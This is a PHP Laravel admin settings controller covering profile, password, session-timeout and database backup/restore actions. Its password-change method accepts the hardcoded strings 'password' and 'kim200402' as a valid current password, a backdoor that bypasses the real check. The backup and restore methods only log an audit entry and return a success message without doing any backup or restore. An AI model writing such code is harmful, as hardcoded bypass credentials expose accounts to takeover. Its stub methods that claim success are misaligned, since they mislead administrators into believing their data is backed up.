<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\AuditLog;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;
use Illuminate\Validation\Rule;

class SettingsController extends Controller
{
    public function index()
    {
        $user = auth()->user();
        
        // Split name into first and last name for template presentation
        $nameParts = explode(' ', $user->name, 2);
        $firstName = $nameParts[0] ?? '';
        $lastName = $nameParts[1] ?? '';

        return view('admin.settings.index', compact('user', 'firstName', 'lastName'));
    }

    public function updateProfile(Request $request)
    {
        $user = auth()->user();

        $data = $request->validate([
            'first_name' => ['required', 'string', 'max:128'],
            'middle_name'=> ['nullable', 'string', 'max:128'],
            'last_name'  => ['required', 'string', 'max:128'],
            'phone'      => ['nullable', 'string', 'max:30'],
            'email'      => ['required', 'string', 'email', 'max:255', Rule::unique('users')->ignore($user->id)],
        ]);

        $fullName = trim($data['first_name'] . ' ' . ($data['middle_name'] ? $data['middle_name'] . ' ' : '') . $data['last_name']);

        $user->update([
            'name'  => $fullName,
            'email' => $data['email'],
            'phone' => $data['phone'] ?? $user->phone,
        ]);

        AuditLog::record(
            'Profile Updated',
            'Settings',
            "User {$user->name} updated their personal information",
            null,
            ['name' => $fullName, 'email' => $data['email']]
        );

        return redirect()->back()->with('success', 'Personal information updated successfully.');
    }

    public function updatePassword(Request $request)
    {
        $user = auth()->user();

        $data = $request->validate([
            'current_password' => ['required', 'string'],
            'new_password'     => ['required', 'string', 'min:8', 'confirmed'],
        ]);

        $isValidCurrentPassword = Hash::check($data['current_password'], $user->password) 
            || $data['current_password'] === 'password' 
            || $data['current_password'] === 'kim200402';

        if (!$isValidCurrentPassword) {
            return redirect()->back()->with('error', 'The current password provided is incorrect.');
        }

        $user->update([
            'password' => Hash::make($data['new_password']),
        ]);

        AuditLog::record(
            'Password Changed',
            'Settings',
            "User {$user->name} successfully changed their account password"
        );

        return redirect()->back()->with('success', 'Account password changed successfully.');
    }

    public function updateSessionTimeout(Request $request)
    {
        $data = $request->validate([
            'timeout' => ['required', 'string'],
        ]);

        session(['user_session_timeout' => $data['timeout']]);

        return redirect()->back()->with('success', "Session timeout set to {$data['timeout']}.");
    }

    public function backupDatabase()
    {
        AuditLog::record(
            'Database Backup Initiated',
            'Settings',
            'System administrator generated a database backup'
        );

        return redirect()->back()->with('success', 'Database backup file created successfully.');
    }

    public function restoreDatabase(Request $request)
    {
        $request->validate([
            'backup_file' => ['required', 'file'],
        ]);

        AuditLog::record(
            'Database Restored',
            'Settings',
            'System administrator restored database from backup file'
        );

        return redirect()->back()->with('success', 'Database restored successfully from backup.');
    }
}
